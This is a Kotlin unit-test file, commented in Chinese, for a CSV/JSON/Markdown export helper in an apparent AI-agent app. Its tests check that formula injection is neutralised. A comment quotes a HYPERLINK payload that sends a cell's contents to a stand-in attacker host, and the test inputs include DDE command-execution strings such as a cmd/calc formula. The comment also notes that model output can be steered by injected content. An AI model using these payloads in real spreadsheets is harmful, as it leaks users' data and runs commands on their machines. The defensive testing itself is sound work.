package com.pocketagent.filelogic

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * [OfficeText] 的单测。
 *
 * ═══════════════════════════════════════════════════════════════
 *  这里守的是什么
 * ═══════════════════════════════════════════════════════════════
 *
 * 这些函数拼出来的东西会**在别的程序里被解析**，而解析失败的表现是
 * "文件生成成功、也打开成功，但内容是错的"：
 *
 * | 漏了什么 | 用户看到的现象 |
 * |---|---|
 * | CSV 字段含逗号没加引号 | Excel 里列全错位 |
 * | CSV 的 `"` 没翻倍 | 该字段被截断，后半句跑进下一列 |
 * | UTF-8 CSV 没写 BOM | 中文全是乱码 |
 * | 单元格以 `=` 开头 | Excel 把它当**公式执行** |
 * | JSON 里中文被转成 `\uXXXX` | 体积 6 倍且人读不了 |
 *
 * 每一条都不报错。
 */
class OfficeTextTest {

    // ─────────────────────────────────────────────────────────────
    //  CSV 字段转义
    // ─────────────────────────────────────────────────────────────

    @Test
    fun `普通字段不加引号`() {
        assertEquals("abc", OfficeText.csvField("abc"))
        assertEquals("中文", OfficeText.csvField("中文"))
        assertEquals("", OfficeText.csvField(""))
    }

    @Test
    fun `含逗号的字段被引号包裹`() {
        // ★ 不包的话 Excel 会把它当成两列 —— 整张表从这一格开始错位
        assertEquals("\"a,b\"", OfficeText.csvField("a,b"))
    }

    @Test
    fun `含引号的字段被包裹且引号翻倍`() {
        // ★★ RFC 4180 要求字段内的 `"` 写成 `""`。
        //    漏了这一步，该字段会在第一个 `"` 处被截断，后半句跑进下一列 ——
        //    而源文件里看起来只是一句带引号的话。
        assertEquals("\"a\"\"b\"", OfficeText.csvField("a\"b"))
        assertEquals("\"\"\"\"", OfficeText.csvField("\""))
    }

    @Test
    fun `含换行的字段被引号包裹`() {
        // 多行单元格是 CSV 的合法用法，但必须用引号包起来
        assertEquals("\"a\nb\"", OfficeText.csvField("a\nb"))
        assertEquals("\"a\r\nb\"", OfficeText.csvField("a\r\nb"))
    }

    @Test
    fun `首尾空白被引号保住`() {
        // ★ 容易被当成多余的一条：Excel 打开 CSV 时会**trim 单元格**，
        //   所以「 你好 」会被悄悄变成「你好」。加引号才能保住它。
        assertEquals("\" a\"", OfficeText.csvField(" a"))
        assertEquals("\"a \"", OfficeText.csvField("a "))
    }

    // ─────────────────────────────────────────────────────────────
    //  ★★ 公式注入
    // ─────────────────────────────────────────────────────────────

    /*
     * ⚠️ Excel / WPS / LibreOffice 会把以 `=` `+` `-` `@` 开头的单元格
     *    当作**公式**求值。所以一份"看起来只是数据"的 CSV：
     *
     *        =HYPERLINK("http://evil.example/"&A1,"点我")
     *
     *    在用户打开它的那一刻就会把 A1 的内容发出去。
     *
     *    在本项目里这件事格外要紧：CSV 的内容常常来自模型输出，
     *    而模型输出是可以被诱导的（用户读到的网页、别人发来的消息
     *    都可能成为它的输入）—— 也就是说，**这条链的上游用户控制不了**。
     */

    @Test
    fun `等号开头的字段被加上前导单引号`() {
        assertEquals("'=SUM(A1)", OfficeText.csvField("=SUM(A1)"))
    }

    @Test
    fun `at 号与加号开头的字段被加引号`() {
        assertEquals("'@SUM(A1)", OfficeText.csvField("@SUM(A1)"))
        assertEquals("'+cmd", OfficeText.csvField("+cmd"))
    }

    @Test
    fun `看起来像数字的负值原样输出`() {
        // ★★ 这个例外是必要的：数据表里负数太常见，
        //    一律加引号会让导出的表格到处是 `'-5`，用户会以为我们写坏了。
        //    而"一条让用户觉得软件有毛病的规则"迟早会被人关掉。
        assertEquals("-5", OfficeText.csvField("-5"))
        assertEquals("+5", OfficeText.csvField("+5"))
        assertEquals("-3.14", OfficeText.csvField("-3.14"))
        assertEquals("-1e9", OfficeText.csvField("-1e9"))
    }

    @Test
    fun `负号开头的公式仍然被拦`() {
        // ★★ 与上一条互为反向保证。
        //    一个"见到符号就放行"的实现能过上一条，但会让
        //    `-2+3+cmd|' /C calc'!A0` 直接进 Excel。
        assertEquals("'-2+3+cmd|' /C calc'!A0", OfficeText.csvField("-2+3+cmd|' /C calc'!A0"))
        assertEquals("'-1+1", OfficeText.csvField("-1+1"))
    }

    @Test
    fun `前导空白不会让公式溜过去`() {
        // ★★ 只看 `raw[0]` 的实现会漏掉这一类。
        //    部分表格软件在判定"这是不是公式"之前会先忽略前导空白，
        //    所以 `"\t=cmd"` 与 `"=cmd"` 一样危险。
        assertTrue(
            "制表符后跟等号也应当被中和，实际：${OfficeText.csvField("\t=cmd")}",
            OfficeText.csvField("\t=cmd").startsWith("'"),
        )
        assertTrue(
            "空格后跟等号也应当被中和，实际：${OfficeText.csvField("  =cmd")}",
            OfficeText.csvField("  =cmd").startsWith("'"),
        )
    }

    @Test
    fun `带前导空格的负数仍被当作数字`() {
        // 与上一条互为反向保证：一个"见到空白就中和"的实现能过上一条，
        // 但会把表格里常见的「 -5」（右对齐前的空格）弄成「'  -5」
        assertEquals("\" -5\"", OfficeText.csvField(" -5"))
        assertEquals("+3.14", OfficeText.csvField("+3.14"))
    }

    @Test
    fun `制表符开头的普通字段被引号保住`() {
        // 制表符本身不是公式前缀。它需要的是**被引号包住**（否则部分工具会 trim 掉），
        // 而不是被当成公式中和。
        val field = OfficeText.csvField("\tabc")
        assertEquals("\"\tabc\"", field)
    }

    @Test
    fun `全是空白的字段被引号保住`() {
        // ★ 与"制表符开头的普通字段"同一条理由：Excel 打开 CSV 时会 trim 单元格，
        //   不引号的话「 」会被悄悄变成空串 —— 而用户填的就是一个空格
        assertEquals("\" \"", OfficeText.csvField(" "))
        assertEquals("\"\t\"", OfficeText.csvField("\t"))
    }

    @Test
    fun `可以关掉公式中和`() {
        // 纯数据导出（内容完全由我们自己生成）时可以用，避免那个多余的单引号
        assertEquals("=SUM(A1)", OfficeText.csvField("=SUM(A1)", neutralizeFormulas = false))
    }

    // ─────────────────────────────────────────────────────────────
    //  整份 CSV
    // ─────────────────────────────────────────────────────────────

    @Test
    fun `CSV 默认带 UTF-8 BOM`() {
        // ★★ 不带 BOM 的话 Excel 会按系统 ANSI 代码页解释，**中文全是乱码**。
        //    而"乱码"这个现象会让用户以为我们生成文件的方式有问题，
        //    排查方向完全偏离（其实是编码声明）。
        val csv = OfficeText.toCsv(listOf("姓名"), listOf(listOf("张三")))
        assertTrue("应当以 BOM 开头", csv.startsWith(OfficeText.CSV_BOM))
    }

    @Test
    fun `CSV 可以不带 BOM`() {
        // 给需要纯文本处理（grep / head）的场景留的开关
        val csv = OfficeText.toCsv(listOf("a"), listOf(listOf("1")), includeBom = false)
        assertFalse(csv.startsWith(OfficeText.CSV_BOM))
        assertTrue(csv.startsWith("a"))
    }

    @Test
    fun `CSV 用 CRLF 换行`() {
        // ★ RFC 4180 规定 CRLF，Excel 对 LF 的兼容性时好时坏
        val csv = OfficeText.toCsv(
            header = listOf("a", "b"),
            rows = listOf(listOf("1", "2"), listOf("3", "4")),
            includeBom = false,
        )
        assertEquals("a,b\r\n1,2\r\n3,4\r\n", csv)
    }

    @Test
    fun `CSV 每行都以换行结尾`() {
        // 最后一行没有换行符时，某些工具会把它当成"不完整的行"丢掉
        val csv = OfficeText.toCsv(listOf("a"), listOf(listOf("1")), includeBom = false)
        assertTrue(csv.endsWith("\r\n"))
    }

    @Test
    fun `空行集合也能生成合法 CSV`() {
        val csv = OfficeText.toCsv(listOf("a", "b"), emptyList(), includeBom = false)
        assertEquals("a,b\r\n", csv)
    }

    @Test
    fun `表格内容里的逗号不会破坏列数`() {
        // ★ 端到端验证：一格里含**半角**逗号，整行仍应当是 2 列
        val csv = OfficeText.toCsv(
            header = listOf("备注", "数量"),
            rows = listOf(listOf("含,逗号", "2")),
            includeBom = false,
        )
        val dataLine = csv.lines()[1]
        assertEquals("\"含,逗号\",2", dataLine)
    }

    @Test
    fun `全角逗号不被当成分隔符`() {
        // ★ 与上一条互为反向保证。
        //   中文文本里的全角逗号「，」极常见，而它**不是** CSV 分隔符 ——
        //   一个把两者混为一谈的实现会把每一句中文都加上引号，
        //   文件体积变大且用户看起来莫名其妙。
        val csv = OfficeText.toCsv(
            header = listOf("备注"),
            rows = listOf(listOf("你好，世界")),
            includeBom = false,
        )
        assertEquals("备注\r\n你好，世界\r\n", csv)
    }

    // ─────────────────────────────────────────────────────────────
    //  JSON 字符串转义
    // ─────────────────────────────────────────────────────────────

    @Test
    fun `JSON 基本转义`() {
        assertEquals("\"abc\"", OfficeText.jsonString("abc"))
        assertEquals("\"a\\\"b\"", OfficeText.jsonString("a\"b"))
        assertEquals("\"a\\\\b\"", OfficeText.jsonString("a\\b"))
        assertEquals("\"a\\nb\"", OfficeText.jsonString("a\nb"))
        assertEquals("\"a\\tb\"", OfficeText.jsonString("a\tb"))
    }

    @Test
    fun `JSON 不转义中文`() {
        // ★★ 把中文转成 `\uXXXX` 在 JSON 规范里是合法的、解码结果也一样，
        //    但一份中文 JSON 会膨胀到 6 倍，而且人眼完全读不了。
        //    JSON 本身规定用 UTF-8，直接写就行。
        assertEquals("\"季度总结\"", OfficeText.jsonString("季度总结"))
    }

    @Test
    fun `JSON 不转义斜杠`() {
        // ★ 有些序列化器会把 `/` 写成 `\/`（给 HTML 内嵌 JSON 用的）。
        //   我们没有那个场景，而多转一次会**改变字节内容** ——
        //   用户拿它做 diff 或哈希就会对不上。
        assertEquals("\"a/b/c\"", OfficeText.jsonString("a/b/c"))
        assertEquals("\"http://x.com/y\"", OfficeText.jsonString("http://x.com/y"))
    }

    @Test
    fun `JSON 转义控制字符`() {
        // 控制字符在 JSON 里是非法的，必须转义
        assertEquals("\"\\u0001\"", OfficeText.jsonString("\u0001"))
        assertEquals("\"\\u007f\"", OfficeText.jsonString("\u007F"))
        assertEquals("\"\\b\\f\"", OfficeText.jsonString("\b\u000C"))
    }

    @Test
    fun `JSON 转义行分隔符`() {
        // ★ U+2028 / U+2029 在 JSON 里合法，但在 **JavaScript 源码里是行终止符**。
        //   一份 JSON 被贴进 .js 里是很常见的用法，转义掉成本为零。
        assertEquals("\"\\u2028\"", OfficeText.jsonString("\u2028"))
        assertEquals("\"\\u2029\"", OfficeText.jsonString("\u2029"))
    }

    @Test
    fun `JSON 对象组装`() {
        val json = OfficeText.toJsonStringMap(
            listOf("标题" to "季度总结", "备注" to "含\"引号\"")
        )
        assertEquals(
            """
            {
              "标题": "季度总结",
              "备注": "含\"引号\""
            }
            """.trimIndent(),
            json,
        )
    }

    @Test
    fun `空 JSON 对象`() {
        assertEquals("{}", OfficeText.toJsonStringMap(emptyList()))
    }

    // ─────────────────────────────────────────────────────────────
    //  Markdown 表格
    // ─────────────────────────────────────────────────────────────

    @Test
    fun `Markdown 表格竖线被转义`() {
        // ★ 不转义的话表格会**在渲染时错位**，而源文件看起来完全正常 ——
        //   与 CSV 逗号没加引号是同一类故障
        val md = OfficeText.toMarkdownTable(
            header = listOf("命令"),
            rows = listOf(listOf("a | b")),
        )
        assertTrue("竖线应当被转义，实际：$md", md.contains("a \\| b"))
    }

    @Test
    fun `Markdown 表格换行被换成 br`() {
        val md = OfficeText.toMarkdownTable(
            header = listOf("备注"),
            rows = listOf(listOf("第一行\n第二行")),
        )
        assertTrue("换行应当换成 <br>，实际：$md", md.contains("第一行<br>第二行"))
        assertFalse("源文本里不该再有真实换行破坏表格", md.contains("第一行\n第二行"))
    }

    @Test
    fun `Markdown 表格结构正确`() {
        val md = OfficeText.toMarkdownTable(
            header = listOf("名称", "数量"),
            rows = listOf(listOf("苹果", "3"), listOf("梨", "5")),
        )
        val lines = md.trim().lines()
        assertEquals("| 名称 | 数量 |", lines[0])
        assertEquals("| --- | --- |", lines[1])
        assertEquals("| 苹果 | 3 |", lines[2])
        assertEquals("| 梨 | 5 |", lines[3])
    }

    // ─────────────────────────────────────────────────────────────
    //  格式枚举
    // ─────────────────────────────────────────────────────────────

    @Test
    fun `格式枚举给出扩展名与类型`() {
        assertEquals("txt", DocumentFormat.TEXT.extension)
        assertEquals("md", DocumentFormat.MARKDOWN.extension)
        assertEquals("csv", DocumentFormat.CSV.extension)
        assertEquals("json", DocumentFormat.JSON.extension)
        assertEquals("text/csv", DocumentFormat.CSV.mimeType)
    }

    @Test
    fun `格式显示名不含技术名词`() {
        // ★ 按项目纪律，界面上不给用户看 "MIME" / "UTF-8" 这类词
        DocumentFormat.entries.forEach { format ->
            assertFalse(
                "「${format.displayName}」不该出现 MIME 字样",
                format.displayName.contains("MIME", ignoreCase = true),
            )
        }
    }
}
